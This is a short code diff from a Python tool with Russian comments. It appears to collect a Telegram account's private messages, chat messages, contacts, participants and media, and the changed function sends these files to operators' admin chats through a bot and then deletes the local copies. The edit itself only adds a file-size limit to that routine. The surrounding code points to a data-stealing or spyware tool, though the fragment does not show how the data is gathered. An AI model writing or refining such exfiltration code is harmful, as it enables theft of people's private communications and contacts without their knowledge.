@@ -1700,16 +1700,20 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
     file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html', '_chat_messages.html', '_media_files.zip']
+    max_file_size = 49 * 1024 * 1024  # 49 MB в байтах
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
         
         for file_to_send in files_to_send:
-            for admin_chat_id in admin_chat_ids:
-                with open(file_to_send, "rb") as file:
-                    bot.send_document(admin_chat_id, file)
-                    
-            os.remove(file_to_send)
+            if os.path.getsize(file_to_send) <= max_file_size:  # Проверка размера файла
+                for admin_chat_id in admin_chat_ids:
+                    with open(file_to_send, "rb") as file:
+                        bot.send_document(admin_chat_id, file)
+                os.remove(file_to_send)
+            else:
+                print(f"Файл {file_to_send} слишком большой и не будет отправлен.")
+
 
 # Получаем ИД и Names в текстовый файл оригинал
 def parsing(client, index: int, id: bool, name: bool):
